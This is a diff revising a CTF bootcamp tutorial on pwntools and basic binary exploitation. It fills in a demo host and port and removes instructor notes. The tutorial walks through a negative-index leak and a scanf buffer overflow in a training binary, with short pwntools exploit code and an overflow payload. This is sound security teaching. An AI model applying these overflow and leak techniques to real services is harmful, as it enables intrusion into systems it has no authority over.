@@ -1,20 +1,21 @@
-PwRIVATE NOTE: Getting familiar with pwntools, negative index to overwrite variable and buffer overflow variable. (Same challenge)
-
 # PWN Example 01
 
 This example will introduce you to `pwntools`, in addition to some exploitation of more simple bugs.
 
-In your docker image, this example is available at `TODO: Directory`, and is also running on port `TODO: Port`.
+In your docker image, this example is available if you clone https://github.com/b01lers/bootcamp-training-2020 or https://github.com/b01lers/bootcamp-pwn-examples, and it was also running on `invades.space` at port `4001` during the demo.
 
 ## Compiling and Running the Program
 
 A binary called `example01` should be in this directory. If you run `./example01`, you can see it's behavior.
+```
+━━┫ ./example01 
+Which number in number_list would you like to print?
+> 
+```
 
-PRIVATE NOTE: Actually run the example and show what it does.
-
-In most real CTFs, pwn challenges will provide you with the program, but also be running it on a remote service, which you are supposed to exploit. In our case, a service is running on a port. To connect to the port, just run:
+In most real CTFs, pwn challenges will provide you with the program, but also be running it on a remote service, which you are supposed to exploit. Say a service is running on port 4001 on `example.com`. To connect to the port, just run:
 ```bash
-$ nc localhost TODO: Port
+$ nc example.com 4001
 ```
 
 Note: If the program is not executable for some reason (You might see an error like `permission penied: ./example01`), you may need to run `chmod u+x ./example01` to mark the binary as executable.
@@ -23,9 +24,7 @@ In the example directory, the source code and a Makefile is provided. If you nee
 
 ## Reading the Code and Identifying Vulnerabilities
 
-For this example, and all the rest of these lessons, source will be provided. This is not realistic. Most CTFs will not provide source for binary exploitation challenges, but it is much easier to teach the basics of binary exploitation with out worring about reverse engineering.
-
-PRIVATE NOTE: The bootcamp CTF will provide source for most, if not all of the pwn challenges.
+For this example, and all the rest of these lessons, source will be provided. This is not realistic. Most CTFs will not provide source for binary exploitation challenges, but it is much easier to teach the basics of binary exploitation without worring about reverse engineering.
 
 You will notice these two lines at the top of most pwn challenges written in C or C++:
 ```c
@@ -35,8 +34,6 @@ setvbuf(stdout, 0, 2, 0);
 These disable line buffering in the program to make it easer to interact with the program over the network. Generally, you will not need to worry about these lines of code.
 
 There are two bugs in this example that we will exploit, but there are at least 4 vulnerabilities in the example. **Before reading on, go ahead and look for the vulnerabilities yourself.**
-
-PRIVATE NOTE: Does anyone in chat see the bugs?
 
 ### Bug #1
 
@@ -105,7 +102,6 @@ The correct way to patch this bug would be to simply add checks on the size befo
 
 The second bug is a buffer overflow. The code will read your input beyond the max length of the buffer that it is filling. This is possibly the most commonly seen vulnerability in CTFs, and used to be the most commonly exploited vulnerability in production software (Now it's probably use-after-free attacks, at least for major software).
 
-TODO: Inline code, explained
 ```c
 printf("Enter your name to save your score:\n> ");
 scanf("%s", game_state.name);
@@ -113,9 +109,9 @@ scanf("%s", game_state.name);
 
 The function `scanf`, if given an argument of `"%s"`, will read an unlimited number of characters, causing a buffer overflow. The function `gets(char *)` is similarly dangerous, and functions that read a number of characters (like `fgets`) are dangerous if the number of characters requested is larger than the size of the buffer.
 
-Let's demonstrate this buffer overflow in GDB:
+Let's demonstrate this buffer overflow in GDB.
 
-Note: Sometimes, compilers will try to put strings after other data types to reduce the likelyhood of overflows like this, so order can not be gaurenteed, and you should generally check the assembled binary. In our case, the example has everything within a struct, preserves memory order with optimization disabled in gcc.
+Before we do so, a quick note: Sometimes, compilers will try to put strings after other data types to reduce the likelyhood of overflows like this, so order can not be gaurenteed, and you should generally check the assembled binary. In our case, the example has everything within a struct, which preserves memory order with optimization disabled in gcc.
 
 The length of `name` is 32 bytes, so if we were to write more than 32 bytes, we would overflow into `score`, which is right after `name` in memory. We can see this in gdb:
 ```
@@ -165,8 +161,7 @@ Especially as challenges get longer and require dealing with binary data, it bec
 
 To do this, we usually use Python and the library pwntools. They should both be installed on the dockers, but a simple `pip install pwntools` will install it if you are working on your own machine. Their documentation is available [here](http://docs.pwntools.com/en/stable/), and it is quite good.
 
-PRIVATE NOTE: There are a couple awesome pwntools features that we will get to as we progress. It can help debug, find offsets in multiple ways, emulate and debug programs for different architectures, and more.
-PRIVATE NOTE: Start writing a pwntools script
+There are a couple awesome pwntools features that we will get to as we progress. It can help debug, find offsets in multiple ways, emulate and debug programs for different architectures, and more.
 
 A pwntools script almost always starts by importing everything in pwntools with:
 ```python
@@ -180,15 +175,15 @@ In our case, we want to interact with our binary:
 p = process('./example01')
 ```
 
-This opens the binary as a process, and we can now read and write to it from python. In order to interact with a remote (this challenge is running on port TODO: Port for example), we can do
+This opens the binary as a process, and we can now read and write to it from python. In order to interact with a remote (this challenge is running on port 4001, for example), we can do
 ```python
-r = remote('127.0.0.1', TODO: Port)
+r = remote('invades.space', 4001)
 ```
 
 The API for a process and remote is generally the same, so it is easy to solve the remote once you have a working solution locally. Sometimes you will see something like this in a pwntools script:
 ```python
 if '--remote' in sys.argv:
-    p = remote('127.0.0.1', TODO: Port)
+    p = remote('invades.space', 4001)
 else:
     p = process('./example01')
 ``` 
@@ -211,8 +206,6 @@ p.interactive()
 ```
 
 Using something like `p.interactive()` is useful once you successfully exploit a binary and have a shell that you need to navigate around in. More tools are available, such as `p.recvline_regex` and many others, but the above basics should get you far enough. If you need more, check the docs.
-
-PRIVATE NOTE: Start with 3 line program, ending with p.interactive(), and add code to the middle
 
 In our case, we want to exploit both the vulnerabilities we found when reading the code. 
 
@@ -242,7 +235,7 @@ print('leak: {}'.format(leak))
 p.interactive()
 ```
 
-In this case, we used a regex to extract the value of `secret_number` from the output. Python has many fantastic string manipulation tools, so there are many ways that the value could be extracted from the string.
+In this case, we used a regex to extract the value of `secret_number` from the output. Python has many fantastic string manipulation tools, so there are many ways that the value could be extracted from the string such as something like: `response.split()[2]`.
 
 ### Exploiting Vuln #2
 
@@ -251,4 +244,5 @@ Exploiting the second vulnerability is also relatively simple. After being promp
 payload = b'A' * 32 + p32(0x1337)
 p.sendline(payload)
 ```
-Pwntools has awesome helper functions `p32(int)` and `p64(long)`, which will by default encode the integer as little endian, how numbers are encoded in memory on most machines. These functions will be used a ton to encode addresses and other numbers in further challenges.
+
+Pwntools has awesome helper functions `p32(int)` and `p64(long)`, which will by default encode the integer as little endian, how numbers are encoded in memory on most machines we will be hacking. These functions will be used a ton to encode addresses and other numbers in further challenges.
